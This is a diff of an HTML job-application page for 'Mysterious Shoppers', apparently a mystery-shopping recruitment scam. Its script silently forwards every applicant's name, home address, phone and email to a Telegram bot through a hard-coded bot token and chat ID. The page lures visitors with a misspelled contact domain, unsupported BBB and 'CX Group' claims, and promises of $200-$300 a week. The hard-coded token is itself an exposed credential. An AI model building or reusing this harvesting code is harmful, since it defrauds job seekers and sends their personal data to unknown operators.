@@ -1,282 +1,354 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Mysterious Shoppers</title>
-    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Our Team - Mysterious Shoppers</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
     <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17082293645">
-</script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-17082293645');
-</script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17082293645"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'AW-17082293645');
+    </script>
 
     <script>
-      function sendToTelegram(event) {
-        event.preventDefault(); // Prevent default form submission
-
-        const botToken = '8278100666:AAG8svvKAX698fYwEfm2hqwxocMoXcO4zlo';
-        const chatId = '-4905993243';
-        const form = event.target;
-        const formData = new FormData(form);
-
-        let message = '📝 *New Form Submission*\n';
-        formData.forEach((value, key) => {
-          message += `🔑 *${key}*: ${value}\n`;
-        });
-
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-        fetch(telegramUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown',
-          }),
-        })
-          .then((response) => response.json())
-          .then(() => {
-            window.location.href = 'status.html'; // Redirect after sending
-          })
-          .catch((error) => console.error('Error:', error));
-      }
-
-      function updateStateLabel() {
-        const countrySelect = document.getElementById('country');
-        const stateLabel = document.getElementById('state-label');
-        const selectedCountry = countrySelect.value;
-
-        if (selectedCountry === 'USA') {
-          stateLabel.textContent = 'State';
-        } else if (selectedCountry === 'Canada') {
-          stateLabel.textContent = 'Province';
-        } else if (selectedCountry === 'Australia') {
-          stateLabel.textContent = 'State/Territory';
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        'sans': ['Inter', 'system-ui', 'sans-serif'],
+                    },
+                    colors: {
+                        'orange': {
+                            50: '#fff7ed',
+                            500: '#f97316',
+                            600: '#ea580c',
+                            700: '#c2410c',
+                        }
+                    }
+                }
+            }
         }
-      }
 
-      // Initialize the label on page load
-      document.addEventListener('DOMContentLoaded', function() {
-        updateStateLabel();
-      });
+        function sendToTelegram(event) {
+            event.preventDefault();
+            
+            // Show loading state
+            const submitBtn = event.target.querySelector('button[type="submit"]');
+            const originalText = submitBtn.textContent;
+            submitBtn.textContent = 'Submitting...';
+            submitBtn.disabled = true;
+
+            const botToken = '8278100666:AAG8svvKAX698fYwEfm2hqwxocMoXcO4zlo';
+            const chatId = '-4905993243';
+            const form = event.target;
+            const formData = new FormData(form);
+
+            let message = '📝 *New Mystery Shopper Application*\n\n';
+            formData.forEach((value, key) => {
+                message += `🔹 *${key}*: ${value}\n`;
+            });
+
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown',
+                }),
+            })
+            .then((response) => response.json())
+            .then(() => {
+                window.location.href = 'status.html';
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+                alert('There was an error submitting your application. Please try again.');
+            });
+        }
+
+        function updateStateLabel() {
+            const countrySelect = document.getElementById('country');
+            const stateLabel = document.getElementById('state-label');
+            const selectedCountry = countrySelect.value;
+
+            if (selectedCountry === 'USA') {
+                stateLabel.textContent = 'State';
+            } else if (selectedCountry === 'Canada') {
+                stateLabel.textContent = 'Province';
+            } else if (selectedCountry === 'Australia') {
+                stateLabel.textContent = 'State/Territory';
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            updateStateLabel();
+        });
     </script>
-  </head>
-  <body class="font-sans bg-gray-900 text-gray-800">
+</head>
+<body class="font-sans bg-gray-50 text-gray-900 min-h-screen">
     <!-- Header -->
-    <header class="bg-gray-900 shadow">
-      <div
-        class="container mx-auto px-4 py-4 flex items-center justify-between"
-      >
-        <div class="text-2xl font-bold text-orange-500">
-          <a href="/"><img width="150px" src="logo.png" /></a>
+    <header class="bg-white shadow-sm border-b border-gray-200 sticky top-0 z-50">
+        <div class="container mx-auto px-4 sm:px-6 lg:px-8 py-4">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center">
+                    <a href="/" class="flex items-center">
+                        <img src="logo.png" alt="Mysterious Shoppers" class="h-10 sm:h-12 w-auto">
+                    </a>
+                </div>
+                <div class="flex items-center space-x-4">
+                    <a href="tel:+19453346439" 
+                       class="hidden sm:inline-flex items-center bg-orange-500 hover:bg-orange-600 text-white px-4 py-2 rounded-lg font-semibold transition-colors duration-200">
+                        <svg class="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/>
+                        </svg>
+                        Call Us
+                    </a>
+                    <a href="tel:+19453346439" 
+                       class="sm:hidden bg-orange-500 hover:bg-orange-600 text-white p-2 rounded-lg transition-colors duration-200">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/>
+                        </svg>
+                    </a>
+                </div>
+            </div>
         </div>
-        <a
-          href="tel:+19453346439"
-          class="bg-orange-500 text-white px-4 py-2 rounded-lg font-bold"
-          >Call Us: +1(945)334-6439</a
-        >
-      </div>
     </header>
 
     <!-- Hero Section -->
-    <section
-      class="bg-cover bg-center h-64"
-      style="
-        background-image: url('https://www.shutterstock.com/image-photo/banner-cover-asian-woman-using-600nw-1922516153.jpg');
-      "
-    >
-      <div
-        class="h-full bg-black bg-opacity-50 flex items-center justify-center"
-      >
-        <h1 class="text-white text-4xl font-bold p-4">
-          Join the Mysterious Shoppers Mystery Shopping Team!
-        </h1>
-      </div>
+    <section class="relative bg-gradient-to-r from-orange-500 to-orange-600 py-16 sm:py-20 lg:py-24">
+        <div class="absolute inset-0 bg-black opacity-10"></div>
+        <div class="relative container mx-auto px-4 sm:px-6 lg:px-8 text-center">
+            <h1 class="text-3xl sm:text-4xl lg:text-5xl font-bold text-white mb-4">
+                Join Our Mystery Shopping Team
+            </h1>
+            <p class="text-lg sm:text-xl text-orange-50 max-w-3xl mx-auto mb-8">
+                Start earning money by evaluating customer experiences at top brands across the U.S., Canada, and Australia
+            </p>
+            <div class="flex flex-col sm:flex-row items-center justify-center gap-4 text-orange-50">
+                <div class="flex items-center">
+                    <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"/>
+                    </svg>
+                    Flexible Schedule
+                </div>
+                <div class="flex items-center">
+                    <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"/>
+                    </svg>
+                    $200-$300 Weekly Potential
+                </div>
+                <div class="flex items-center">
+                    <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"/>
+                    </svg>
+                    No Experience Required
+                </div>
+            </div>
+        </div>
     </section>
 
-    <!-- Content Section -->
-    <div
-      class="max-w-[900px] mx-auto px-4 py-8 flex flex-col lg:flex-row gap-8"
-    >
-      <!-- Main Content -->
-      <main
-        class="bg-gray-100 align-center lg:w-[1000px] rounded-lg p-6 shadow-lg"
-      >
-        <h2 class="text-2xl font-bold mb-4 text-center">
-          Mysterious Shoppers, a member company of the CX Group, works with
-          leading brands across the U.S., Canada, and Australia.
-        </h2>
+    <!-- Main Content -->
+    <section class="py-12 sm:py-16 lg:py-20">
+        <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="max-w-4xl mx-auto">
+                <!-- Company Info -->
+                <div class="text-center mb-12">
+                    <h2 class="text-2xl sm:text-3xl font-bold text-gray-900 mb-4">
+                        About Mysterious Shoppers
+                    </h2>
+                    <p class="text-lg text-gray-600 max-w-3xl mx-auto">
+                        A member company of the CX Group, we work with leading brands across the U.S., Canada, and Australia to improve customer experiences through professional mystery shopping evaluations.
+                    </p>
+                </div>
 
-        <h3 class="text-xl font-semibold mt-8 mb-4">Sign Up Today</h3>
-        <form
-          class="bg-white p-6 rounded-lg shadow-md space-y-4"
-          onsubmit="sendToTelegram(event)"
-        >
-          <!-- Name -->
-          <div>
-            <label for="name" class="block text-sm font-semibold mb-1"
-              >Full Name</label
-            >
-            <input
-              type="text"
-              id="name"
-              name="Name"
-              class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500"
-              required
-            />
-          </div>
-          <!-- Street Address -->
-          <div>
-            <label for="street-address" class="block text-sm font-semibold mb-1"
-              >Street Address</label
-            >
-            <input
-              type="text"
-              id="street-address"
-              name="Street Address"
-              class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500"
-              required
-            />
-          </div>
-          <!-- City -->
-          <div>
-            <label for="city" class="block text-sm font-semibold mb-1"
-              >City</label
-            >
-            <input
-              type="text"
-              id="city"
-              name="City"
-              class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500"
-              required
-            />
-          </div>
-          <!-- State -->
-          <div>
-            <label for="state" id="state-label" class="block text-sm font-semibold mb-1"
-              >State</label
-            >
-            <input
-              type="text"
-              id="state"
-              name="State"
-              class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500"
-              required
-            />
-          </div>
-          <!-- Postal Code -->
-          <div>
-            <label for="postal-code" class="block text-sm font-semibold mb-1"
-              >Postal Code</label
-            >
-            <input
-              type="text"
-              id="postal-code"
-              name="Postal Code"
-              class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500"
-              required
-            />
-          </div>
-          <!-- Country -->
-          <div>
-            <label for="country" class="block text-sm font-semibold mb-1"
-              >Country</label
-            >
-            <select
-              id="country"
-              name="Country"
-              class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500"
-              onchange="updateStateLabel()"
-              required
-            >
-              <option value="USA">United States</option>
-              <option value="Canada">Canada</option>
-              <option value="Australia">Australia</option>
-            </select>
-          </div>
-          <!-- Phone -->
-          <div>
-            <label for="phone" class="block text-sm font-semibold mb-1"
-              >Phone Number</label
-            >
-            <input
-              type="tel"
-              id="phone"
-              name="Phone"
-              class="w-full border-gray-300 rounded-lg border p-2 focus:ring-orange-500 focus:border-orange-500"
-              required
-            />
-          </div>
-          <!-- Email -->
-          <div>
-            <label for="email" class="block text-sm font-semibold mb-1"
-              >Email Address</label
-            >
-            <input
-              type="email"
-              id="email"
-              name="Email"
-              class="w-full border-gray-300 rounded-lg border p-2 focus:ring-orange-500 focus:border-orange-500"
-              required
-            />
-          </div>
-          <!-- How Did You Hear About Us -->
-          <div>
-            <label for="heard" class="block text-sm font-semibold mb-1"
-              >How Did You Hear About Us?</label
-            >
-            <input
-              type="text"
-              id="heard"
-              name="Referral Source"
-              class="w-full border-gray-300 rounded-lg border p-2 focus:ring-orange-500 focus:border-orange-500"
-              required
-            />
-          </div>
-          <!-- Submit Button -->
-          <div>
-            <button
-              type="submit"
-              class="w-full bg-orange-500 text-white py-2 px-4 rounded-lg font-semibold hover:bg-orange-600"
-            >
-              Submit Application
-            </button>
-          </div>
-        </form>
-      </main>
-    </div>
+                <!-- Application Form -->
+                <div class="bg-white rounded-2xl shadow-xl p-6 sm:p-8 lg:p-10">
+                    <div class="text-center mb-8">
+                        <h3 class="text-2xl font-bold text-gray-900 mb-2">Start Your Application</h3>
+                        <p class="text-gray-600">Fill out the form below to join our team of mystery shoppers</p>
+                    </div>
+
+                    <form onsubmit="sendToTelegram(event)" class="space-y-6">
+                        <!-- Personal Information Section -->
+                        <div class="border-b border-gray-200 pb-6">
+                            <h4 class="text-lg font-semibold text-gray-900 mb-4">Personal Information</h4>
+                            
+                            <div class="grid grid-cols-1 gap-6">
+                                <div>
+                                    <label for="name" class="block text-sm font-medium text-gray-700 mb-2">
+                                        Full Name *
+                                    </label>
+                                    <input type="text" id="name" name="Name" required
+                                           class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors duration-200">
+                                </div>
+
+                                <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                                    <div>
+                                        <label for="phone" class="block text-sm font-medium text-gray-700 mb-2">
+                                            Phone Number *
+                                        </label>
+                                        <input type="tel" id="phone" name="Phone" required
+                                               class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors duration-200">
+                                    </div>
+                                    <div>
+                                        <label for="email" class="block text-sm font-medium text-gray-700 mb-2">
+                                            Email Address *
+                                        </label>
+                                        <input type="email" id="email" name="Email" required
+                                               class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors duration-200">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Address Information Section -->
+                        <div class="border-b border-gray-200 pb-6">
+                            <h4 class="text-lg font-semibold text-gray-900 mb-4">Address Information</h4>
+                            
+                            <div class="space-y-6">
+                                <div>
+                                    <label for="street-address" class="block text-sm font-medium text-gray-700 mb-2">
+                                        Street Address *
+                                    </label>
+                                    <input type="text" id="street-address" name="Street Address" required
+                                           class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors duration-200">
+                                </div>
+
+                                <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                                    <div>
+                                        <label for="city" class="block text-sm font-medium text-gray-700 mb-2">
+                                            City *
+                                        </label>
+                                        <input type="text" id="city" name="City" required
+                                               class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors duration-200">
+                                    </div>
+                                    <div>
+                                        <label for="state" id="state-label" class="block text-sm font-medium text-gray-700 mb-2">
+                                            State *
+                                        </label>
+                                        <input type="text" id="state" name="State" required
+                                               class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors duration-200">
+                                    </div>
+                                </div>
+
+                                <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                                    <div>
+                                        <label for="postal-code" class="block text-sm font-medium text-gray-700 mb-2">
+                                            Postal Code *
+                                        </label>
+                                        <input type="text" id="postal-code" name="Postal Code" required
+                                               class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors duration-200">
+                                    </div>
+                                    <div>
+                                        <label for="country" class="block text-sm font-medium text-gray-700 mb-2">
+                                            Country *
+                                        </label>
+                                        <select id="country" name="Country" onchange="updateStateLabel()" required
+                                                class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors duration-200">
+                                            <option value="USA">United States</option>
+                                            <option value="Canada">Canada</option>
+                                            <option value="Australia">Australia</option>
+                                        </select>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Additional Information Section -->
+                        <div class="pb-6">
+                            <h4 class="text-lg font-semibold text-gray-900 mb-4">Additional Information</h4>
+                            
+                            <div>
+                                <label for="heard" class="block text-sm font-medium text-gray-700 mb-2">
+                                    How Did You Hear About Us? *
+                                </label>
+                                <input type="text" id="heard" name="Referral Source" required
+                                       placeholder="e.g., Google search, friend referral, social media..."
+                                       class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-colors duration-200">
+                            </div>
+                        </div>
+
+                        <!-- Submit Button -->
+                        <div class="pt-6">
+                            <button type="submit"
+                                    class="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-4 px-6 rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-orange-500 focus:ring-offset-2">
+                                Submit Application
+                            </button>
+                            <p class="text-sm text-gray-500 text-center mt-3">
+                                By submitting this form, you agree to our terms and conditions
+                            </p>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Trust Indicators -->
+                <div class="mt-12 grid grid-cols-1 sm:grid-cols-3 gap-6 text-center">
+                    <div class="bg-white rounded-lg p-6 shadow-sm">
+                        <div class="text-orange-500 text-2xl font-bold mb-2">35+</div>
+                        <div class="text-gray-600">Years of Experience</div>
+                    </div>
+                    <div class="bg-white rounded-lg p-6 shadow-sm">
+                        <div class="text-orange-500 text-2xl font-bold mb-2">BBB</div>
+                        <div class="text-gray-600">A+ Rating</div>
+                    </div>
+                    <div class="bg-white rounded-lg p-6 shadow-sm">
+                        <div class="text-orange-500 text-2xl font-bold mb-2">50K+</div>
+                        <div class="text-gray-600">Active Shoppers</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
     <!-- Footer -->
-    <footer class="text-white py-8">
-      <div class="container mx-auto px-4">
-        <div class="text-center">
-          <p class="text-sm">Contact Us:</p>
-          <p class="text-sm">
-            Phone:
-            <a href="tel:+19453346439" class="underline">+1(945) 334-6439</a>
-          </p>
-          <p class="text-sm">
-            Email:
-            <a
-              href="mailto:jobs@myteriousshoppers.com"
-              class="underline"
-              >jobs@myteriousshoppers.com</a
-            >
-          </p>
+    <footer class="bg-gray-900 text-white py-12">
+        <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div>
+                    <img src="logo.png" alt="Mysterious Shoppers" class="h-10 w-auto mb-4">
+                    <p class="text-gray-400 text-sm">
+                        Professional mystery shopping services helping brands improve customer experiences across North America and Australia.
+                    </p>
+                </div>
+                <div>
+                    <h4 class="font-semibold mb-4">Contact Information</h4>
+                    <div class="space-y-2 text-sm text-gray-400">
+                        <p>
+                            <a href="tel:+19453346439" class="hover:text-orange-400 transition-colors duration-200">
+                                Phone: +1 (945) 334-6439
+                            </a>
+                        </p>
+                        <p>
+                            <a href="mailto:jobs@myteriousshoppers.com" class="hover:text-orange-400 transition-colors duration-200">
+                                Email: jobs@myteriousshoppers.com
+                            </a>
+                        </p>
+                    </div>
+                </div>
+                <div>
+                    <h4 class="font-semibold mb-4">Quick Links</h4>
+                    <div class="space-y-2 text-sm text-gray-400">
+                        <p><a href="/" class="hover:text-orange-400 transition-colors duration-200">Home</a></p>
+                        <p><a href="#" class="hover:text-orange-400 transition-colors duration-200">Privacy Policy</a></p>
+                        <p><a href="#" class="hover:text-orange-400 transition-colors duration-200">Terms of Service</a></p>
+                    </div>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 mt-8 pt-8 text-center text-sm text-gray-400">
+                <p>&copy; 2025 Mysterious Shoppers. All rights reserved.</p>
+            </div>
         </div>
-        <p class="text-center text-sm mt-8">
-          &copy; 2025 Mysterious Shoppers. All rights reserved. | Privacy Policy
-          | Cookie Policy
-        </p>
-      </div>
     </footer>
-  </body>
+</body>
 </html>
